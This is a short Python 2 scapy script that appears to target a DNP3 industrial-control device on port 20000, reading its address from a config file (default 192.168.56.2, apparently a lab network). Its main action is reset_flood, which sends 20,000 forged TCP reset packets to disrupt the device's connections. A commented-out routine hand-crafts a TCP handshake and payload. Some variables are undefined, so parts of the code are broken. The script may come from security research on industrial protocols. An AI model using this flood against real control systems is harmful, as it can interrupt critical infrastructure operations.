__author__ = 'Nicholas Rodofile'

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from DNP3_Lib_ import *

get = ''
dst = "192.168.56.2"
seq = 0
port = 20000
sport = 56550

def reset_flood(seq, dst):
    ip = IP(dst=dst)
    TCP_RESET = TCP(sport=sport, dport=port, flags="R")
    send((ip/TCP_RESET)*20000)

def threeway_handshake(seq, dst):
    ip = IP(dst=dst)
    TCP_SYN = TCP(sport=port, dport=port, flags="S", seq=seq)
    TCP_SYNACK = sr1(ip/TCP_SYN)
    seq += 1

    my_ack = TCP_SYNACK.seq + 1
    TCP_ACK = TCP(sport=port, dport=port, flags="A", seq=seq, ack=my_ack)
    send(ip/TCP_ACK)
    seq += 1

    my_payload = "space for rent!"
    TCP_PUSH = TCP(sport=port, dport=port, flags="PA", seq=seq, ack=my_ack)
    dnp3 = sr1(ip/TCP_PUSH/my_payload)
    pkt = sniff(count=3)
    seq += 1

    dnp3.show2()
    for p in pkt:
        p.show2()


    RST=TCP(ack=my_ack, seq=next_seq, sport=sp, dport=80, flags="RA")
    send(ip/RST)

nodes = read_config()
dst = nodes['slave']['ipv4']
print dst
#threeway_handshake(seq, dst)
reset_flood(0, dst)


print "DONE"